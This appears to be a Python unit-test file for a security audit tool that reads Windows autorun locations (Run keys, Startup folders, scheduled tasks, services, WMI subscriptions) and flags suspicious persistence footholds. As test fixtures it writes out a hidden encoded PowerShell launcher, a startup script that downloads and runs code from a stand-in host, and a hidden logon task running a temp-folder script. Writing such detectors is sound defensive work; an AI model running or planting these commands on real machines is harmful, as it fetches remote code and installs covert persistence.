#!/usr/bin/env python3
"""The Windows autorun surfaces are read — Run keys, Startup folders, scheduled tasks, automatic
services and WMI consumers — and a foothold there is graded like one in a launch agent; a place
that cannot be read is unknown, and nothing changes for a macOS or Linux entry."""
from __future__ import annotations

import codecs
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace

from stayawake.bots.security.hygiene.autorun import baseline, grade, provenance, surface, windows

_ENCODED = "powershell.exe -w hidden -enc " + "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"


class _Registry:
    def __init__(self, values=None, subkeys=None, unreadable=()):
        self._values, self._subkeys, self._unreadable = values or {}, subkeys or {}, set(unreadable)

    def values(self, hive, key, *, wow64=False):
        where = (hive, key, wow64)
        if where in self._unreadable:
            return None
        return list(self._values.get(where, []))

    def subkeys(self, hive, key):
        return list(self._subkeys.get((hive, key), []))


def _no_wmi(_argv):
    return SimpleNamespace(returncode=0, stdout="[]")


def _read(registry=None, environ=None, run=_no_wmi):
    unread: list = []
    found = windows.entries(unread, registry=registry or _Registry(), environ=environ or {}, run=run)
    return found, unread


def _graded(entry):
    attrib = provenance.attribute(entry)
    shape = grade.content_signal(entry, read_referenced=not attrib.attributed)
    return grade.grade(entry, attrib, baseline.KNOWN, shape, False)


_RUN = r"Software\Microsoft\Windows\CurrentVersion\Run"


class TestRunKeys(unittest.TestCase):
    def test_each_value_is_an_entry_that_runs_at_logon(self):
        reg = _Registry({("HKCU", _RUN, False): [("Updater", _ENCODED)]})
        found, unread = _read(reg)
        self.assertEqual(1, len(found))
        self.assertEqual(windows.RUN_KEY, found[0].location)
        self.assertEqual(["at-logon"], found[0].persistence)
        self.assertEqual([], unread)

    def test_an_encoded_powershell_command_is_a_foothold(self):
        reg = _Registry({("HKCU", _RUN, False): [("Updater", _ENCODED)]})
        issue = _graded(_read(reg)[0][0])
        self.assertIsNotNone(issue)
        self.assertEqual(grade.FOOTHOLD_ID, issue.id)
        self.assertIn("encoded PowerShell", issue.detail)

    def test_a_program_in_the_temporary_folder_is_a_foothold(self):
        reg = _Registry({("HKCU", _RUN, False): [
            ("svc", r"C:\Users\me\AppData\Local\Temp\svc.exe --quiet")]})
        issue = _graded(_read(reg)[0][0])
        self.assertIsNotNone(issue)
        self.assertEqual(grade.FOOTHOLD_ID, issue.id)

    def test_a_vendor_program_is_not_reported(self):
        reg = _Registry({("HKLM", _RUN, False): [
            ("Tray", r'"C:\Program Files\Vendor\tray.exe" --minimized')]})
        found = _read(reg)[0]
        self.assertEqual(r"C:\Program Files\Vendor\tray.exe", found[0].argv[0])
        self.assertIsNone(_graded(found[0]))

    def test_a_key_that_cannot_be_read_is_unknown(self):
        reg = _Registry(unreadable={("HKLM", _RUN, False)})
        _found, unread = _read(reg)
        self.assertIn(Path(f"HKLM\\{_RUN}"), unread)

    def test_the_32_bit_view_is_read_too(self):
        reg = _Registry({("HKLM", _RUN, True): [("Old", r"C:\Users\Public\x.exe")]})
        found = _read(reg)[0]
        self.assertIn("WOW6432Node", str(found[0].path))


class TestScheduledTasks(unittest.TestCase):
    _TASK = ('<?xml version="1.0" encoding="UTF-16"?>'
             '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
             "<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>"
             "<Settings><Hidden>true</Hidden></Settings>"
             "<Actions><Exec><Command>cmd.exe</Command>"
             r"<Arguments>/c C:\Users\me\AppData\Local\Temp\a.bat</Arguments></Exec></Actions></Task>")

    def setUp(self):
        self.root = Path(tempfile.mkdtemp())
        tasks = self.root / "System32" / "Tasks" / "Microsoft"
        tasks.mkdir(parents=True)
        (tasks / "Sync").write_bytes(codecs.BOM_UTF16_LE + self._TASK.encode("utf-16-le"))

    def test_a_task_stored_as_utf16_is_read_with_its_trigger(self):
        found, unread = _read(environ={"SystemRoot": str(self.root)})
        task = [e for e in found if e.location == windows.SCHEDULED_TASK]
        self.assertEqual(1, len(task))
        self.assertEqual(["at-logon"], task[0].persistence)
        self.assertIn("hidden", task[0].notes)
        self.assertEqual([], unread)

    def test_a_task_that_runs_a_script_from_the_temporary_folder_is_a_foothold(self):
        found, _ = _read(environ={"SystemRoot": str(self.root)})
        issue = _graded(next(e for e in found if e.location == windows.SCHEDULED_TASK))
        self.assertIsNotNone(issue)
        self.assertIn("folder any program can write to", issue.detail)

    def test_a_file_that_is_not_a_task_is_unknown(self):
        (self.root / "System32" / "Tasks" / "Broken").write_text("not xml")
        _found, unread = _read(environ={"SystemRoot": str(self.root)})
        self.assertTrue(any(p.name == "Broken" for p in unread))


class TestStartupFoldersServicesAndWmi(unittest.TestCase):
    def test_a_script_in_the_startup_folder_is_an_entry(self):
        appdata = Path(tempfile.mkdtemp())
        startup = appdata / "Microsoft/Windows/Start Menu/Programs/Startup"
        startup.mkdir(parents=True)
        (startup / "run.bat").write_text("powershell -c \"iex (iwr http://x.test/a)\"")
        found, _ = _read(environ={"APPDATA": str(appdata)})
        entry = next(e for e in found if e.location == windows.STARTUP_FOLDER)
        self.assertIn("downloads code and runs it", windows.command_shapes(entry))

    def test_an_automatic_service_is_read_and_a_manual_one_is_not(self):
        services = r"SYSTEM\CurrentControlSet\Services"
        reg = _Registry(
            values={("HKLM", services + r"\Auto", False): [("ImagePath", r"C:\Users\Public\s.exe"),
                                                            ("Start", 2), ("Type", 0x10)],
                    ("HKLM", services + r"\Manual", False): [("ImagePath", r"C:\x.exe"),
                                                              ("Start", 3), ("Type", 0x10)]},
            subkeys={("HKLM", services): ["Auto", "Manual"]})
        found = [e for e in _read(reg)[0] if e.location == windows.SERVICE]
        self.assertEqual(["Auto"], [e.path.name.split("\\")[-1] for e in found])

    def test_a_wmi_consumer_that_runs_a_script_is_a_foothold(self):
        out = '[{"kind": "script", "name": "Updater", "command": "", "script": "Set o=CreateObject(1)"}]'
        found, _ = _read(run=lambda _a: SimpleNamespace(returncode=0, stdout=out))
        entry = next(e for e in found if e.location == windows.WMI_CONSUMER)
        self.assertIn("runs a script through a WMI event subscription", windows.command_shapes(entry))

    def test_wmi_that_cannot_be_queried_is_unknown(self):
        _found, unread = _read(run=lambda _a: None)
        self.assertIn(Path("WMI root\\subscription"), unread)


class TestNothingChangesElsewhere(unittest.TestCase):
    def test_a_launch_agent_gets_no_windows_reason(self):
        entry = surface.AutorunEntry(location=surface.LAUNCH_AGENT, path=Path("/x.plist"),
                                     argv=["/bin/sh", "-c", _ENCODED], body=_ENCODED)
        self.assertEqual([], windows.command_shapes(entry))

    def test_a_posix_path_is_classified_as_before(self):
        self.assertEqual("trusted", provenance._classify_path("/usr/bin/true"))

    def test_the_command_line_is_split_as_windows_reads_it(self):
        self.assertEqual([r"C:\Program Files\A\a.exe", "-x"],
                         windows.split_command(r"C:\Program Files\A\a.exe -x"))
        self.assertEqual([r"C:\B\b.exe", '"two words"'],
                         windows.split_command(r'"C:\B\b.exe" "two words"'))


class TestTheAuditRunsItOnWindows(unittest.TestCase):
    def test_the_autorun_probe_runs_and_the_other_posix_probes_still_do_not(self):
        from unittest import mock
        from stayawake.bots.security import hygiene
        with mock.patch("sys.platform", "win32"):
            ran = hygiene.run_check("autorun surface", lambda: [])
            skipped = hygiene.run_check("shell startup files", lambda: [])
        self.assertNotEqual(hygiene.NOT_IMPLEMENTED, ran.state)
        self.assertEqual(hygiene.NOT_IMPLEMENTED, skipped.state)


if __name__ == "__main__":
    unittest.main()
